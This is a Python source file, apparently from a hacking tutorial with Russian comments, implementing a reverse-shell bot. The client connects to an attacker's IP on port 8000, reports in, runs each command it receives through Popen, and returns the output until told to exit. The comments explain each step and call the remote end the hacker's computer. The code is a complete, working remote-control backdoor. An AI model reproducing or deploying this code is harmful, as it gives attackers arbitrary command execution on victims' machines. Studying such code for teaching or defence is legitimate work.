import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1] # 1
serverPort = 8000

# Создать IPv4(AF_INET), TCP-сокет (Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting of Duty'.encode())

command = clientSocket.recv(4064).decode()
while command != "exit":
    proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE)
    result, err = proc.communicate()
    clientSocket.send(result)
    command = (clientSocket.recv(4064).decode())
clientSocket.close()



# Мы считываем IP-адрес злоумышленника из первого параметра командной строки, который вы укажете при запуске программы .
# Затем создаем новый клиентский сокет .
# Параметр AF_INET приказывает библиотеке сокетов создать сокет IPV4, а параметр SOCK_STREAM — сделать его TCP-сокетом. Если вы хотите создать UDP-сокет IPv6,
# то вместо этого укажите параметры AF_INET6 и SOCK_DGRAM.
#
# Создав сокет, вы можете использовать его для подключения к сокету на компьютере хакера путем передачи кортежа, содержащего соответствующий IP-адрес и номер порта 
# . Кортежи — это неизменяемые списки, которые объявляются с помощью круглых (), а не квадратных скобок [].
# В данном случае кортеж содержит переменные, которые мы определили ранее в программе, поэтому он должен выглядеть примерно так: (172.217.12.238,8000).
#
# Затем клиент должен уведомить компьютер злоумышленника о том, что он готов принимать команды.
# Библиотека socket языка Python предназначена для отправки двоичных данных, поэтому, если вы хотите отправить строку 'Botreportingforduty',
# то должны сначала преобразовать ее в двоичный формат, вызвав функцию .encode(). Точно так же вся информация, полученная от сокета,
# будет представлена в двоичном формате, поэтому программе придется преобразовать ее в строку .
# Значение 4064 указывает максимальное количество подлежащих чтению байтов.
#
# Клиент будет принимать и выполнять команды до тех пор, пока хакер не отправит команду exit.
# Метод Popen создает копию или ответвление текущего процесса, называемое подпроцессом.
# Затем он передает команду этому подпроцессу, выполняющему ее на клиенте,
# после чего функция proc.communicate() считывает результаты, которые затем отправляются на компьютер хакера.
#
